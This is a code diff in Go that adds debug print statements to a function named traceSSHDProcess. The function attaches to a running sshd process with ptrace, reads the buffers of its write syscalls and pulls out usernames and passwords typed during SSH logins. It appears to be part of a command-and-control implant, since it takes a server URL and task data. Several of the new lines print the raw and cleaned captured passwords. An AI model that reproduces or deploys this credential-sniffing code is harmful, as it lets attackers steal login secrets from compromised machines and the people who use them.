@@ -14,6 +14,7 @@ import (
 	"syscall"
 )
 
+
 func traceSSHDProcess(ctx context.Context, serverUrl string, taskData map[string]interface{}, pid int) {
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
@@ -38,6 +39,9 @@ func traceSSHDProcess(ctx context.Context, serverUrl string, taskData map[string
 
 		_, err := syscall.Wait4(pid, &wstatus, 0, nil)
 		if err != nil {
+			if debug.Debug {
+				fmt.Printf("[*] Wait4 error: %v\n", err)
+			}
 			return
 		}
 		if ctx.Err() != nil {
@@ -53,6 +57,9 @@ func traceSSHDProcess(ctx context.Context, serverUrl string, taskData map[string
 
 			var regs syscall.PtraceRegs
 			if err := syscall.PtraceGetRegs(pid, &regs); err != nil {
+				if debug.Debug {
+					fmt.Printf("[*] PtraceGetRegs error: %v\n", err)
+				}
 				return
 			}
 
@@ -66,6 +73,9 @@ func traceSSHDProcess(ctx context.Context, serverUrl string, taskData map[string
 						if _, err := syscall.PtracePeekData(pid, uintptr(regs.Rsi), buffer); err != nil {
 							syscall.PtraceSyscall(pid, 0)
 							continue
+						}
+						if debug.Debug {
+							fmt.Printf("[*] Captured write syscall to fd %v with buffer: %s\n", fd, string(buffer))
 						}
 
 						var password string
@@ -81,8 +91,13 @@ func traceSSHDProcess(ctx context.Context, serverUrl string, taskData map[string
 						} else {
 							password = string(buffer)
 						}
-
+						if debug.Debug {
+							fmt.Printf("[*] raw potential password from buffer:\n%v\n", password)
+						}
 						password = RemoveNonPrintableAscii(password)
+						if debug.Debug {
+							fmt.Printf("[*] cleaned potential password from buffer:\n%v\n", password)
+						}
 						if IsValidPassword(password) {
 							if firstValidCapture == "" {
 								// First valid capture during SSH auth is the username,
